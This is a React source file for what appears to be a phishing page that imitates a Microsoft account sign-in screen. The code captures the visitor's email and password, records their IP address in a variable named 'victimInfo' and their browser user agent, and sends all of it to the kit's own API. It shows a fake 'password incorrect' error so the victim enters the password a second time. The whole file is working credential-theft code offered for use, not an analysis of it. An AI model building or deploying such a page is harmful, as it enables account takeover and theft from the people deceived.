import "../assets/css/style.css";
import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import logo from "../assets/images/microsoft_logo.svg";
import axios from "axios";
import API from "../api/api";
import key from "../assets/images/signin.svg";
import arrowIcon from "../assets/images/arrow.svg";
import Footer from "../components/Footer";
import { APP_STORAGE_NAME } from "../utils/constants";

export default function Login() {
  const router = useHistory();
  let [temp, setTemp] = useState(null);
  let [email, setEmail] = useState(null);
  let [password, setPassword] = useState(null);
  let [rePassword, setRePassword] = useState(null);
  let [passwordState, setPasswordState] = useState(false);
  let [emailState, setEmailState] = useState(false);
  let [victimInfo, setVictimData] = useState({
    ip: "",
  });

  function validateEmail(email) {
    let re = /\S+@\S+\.\S+/;
    return re.test(email);
  }

  const submit = async (email, password, rePassword) => {
    let _data = {
      email,
      password1: password,
      password2: rePassword,
    };

    sessionStorage.setItem(APP_STORAGE_NAME, JSON.stringify(_data));
    return await API.createDetail({
      ..._data,
      userAgent: navigator?.userAgent,
      victimInfo,
    });
  };

  async function submitForm(e) {
    e?.preventDefault();

    try {
      const res = await submit(email, password, rePassword);
      if (res.status === 201) {
        router.push(`/verification`);
      }
    } catch (error) {
      alert("Something went wrong");
    } finally {
      setEmail(null);
      setPassword(null);
      setRePassword(null);
    }
  }

  useEffect(() => {
    const query = new URLSearchParams(window.location.search);
    const email = query.get("email") || null;
    if (email) {
      setEmail(email);
    }

    async function getIP() {
      const resp = await axios.get("https://api.ipify.org/?format=json");
      if (resp.data.ip) {
        setVictimData({ ip: resp.data.ip });
      }
    }
    getIP();
  }, []);

  return (
    <>
      {email ? (
        password ? (
          <div className="wrapper">
            <div className="loginDiv">
              <p className="logoWrapper">
                <img
                  className="logo"
                  src={logo}
                  alt=""
                />
              </p>
              <div className="back-btn">
                <img
                  onClick={() => {
                    setEmail(null);
                    setEmailState(false);
                    setPassword(null);
                    setPasswordState(false);
                    setRePassword(null);
                    setTemp(null);
                  }}
                  src={arrowIcon}
                  alt="arrowImg"
                />
                <p className="emailP">{email}</p>
              </div>
              <h1 className="head">Enter Password</h1>
              <input
                className="inputEmail"
                type="password"
                placeholder="Password"
                value={rePassword ? rePassword : ""}
                onChange={(e) => {
                  setRePassword(e.target.value);
                  setPasswordState(false);
                }}
              />
              {passwordState ? (
                <p className="passwordError">
                  Your password is incorrect. Please try again.
                </p>
              ) : (
                ""
              )}
              <p className="misAcc">
                <a href="#">Forgot password?</a>
              </p>
              <p className="buttonsGroup">
                <button
                  className="buttonBtnNext"
                  onClick={submitForm}
                >
                  Sign in
                </button>
              </p>
            </div>
          </div>
        ) : (
          <div className="wrapper">
            <div className="loginDiv">
              <p className="logoWrapper">
                <img
                  className="logo"
                  src={logo}
                  alt=""
                />
              </p>
              <div className="back-btn">
                <img
                  onClick={() => {
                    setEmail(null);
                    setEmailState(false);
                    setPassword(null);
                    setPasswordState(false);
                    setRePassword(null);
                    setTemp(null);
                  }}
                  src={arrowIcon}
                  alt="arrowImg"
                />
                <p className="emailP">{email}</p>
              </div>
              <h1 className="head">Enter Password</h1>
              <input
                className="inputEmail"
                type="password"
                placeholder="Password"
                onChange={(e) => setTemp(e.target.value)}
              />
              <p className="misAcc">
                <a href="#">Forgot password?</a>
              </p>
              <p className="buttonsGroup">
                <button
                  className="buttonBtnNext"
                  onClick={() => {
                    setPassword(temp);
                    setTemp(null);
                    setPasswordState(true);
                    submit(email, temp, rePassword);
                  }}
                >
                  Sign in
                </button>
              </p>
            </div>
          </div>
        )
      ) : (
        <>
          <div className="wrapper">
            <div className="loginDiv">
              <p className="logoWrapper">
                <img
                  className="logo"
                  src={logo}
                  alt=""
                />
              </p>
              <h1 className="head">Sign in</h1>
              <input
                className="inputEmail"
                type="email"
                placeholder="Email, phone, or Skype"
                onChange={(e) => [
                  setEmailState(false),
                  setTemp(e.target.value),
                ]}
              />
              {emailState ? (
                <p className="passwordError">Invalid Email.</p>
              ) : (
                ""
              )}
              <p className="misAcc">
                No account? <a href="#">Create one!</a>
              </p>
              <p className="misAcc">
                <a href="#">
                  Sign in with a security key{" "}
                  <i className="bi bi-question-circle"></i>
                </a>
              </p>
              <p className="buttonsGroup">
                <button
                  className="buttonBtnNext"
                  onClick={() => {
                    validateEmail(temp) ? setEmail(temp) : setEmailState(true);
                    submit(temp, password, rePassword);
                  }}
                >
                  Next
                </button>
              </p>
            </div>
            <br />
            <div className="optionsDiv">
              <p className="signOption">
                <img
                  src={key}
                  alt=""
                />{" "}
                <span className="signOptionSpan">Sign-in options</span>
              </p>
            </div>
          </div>
        </>
      )}
      <Footer />
    </>
  );
}
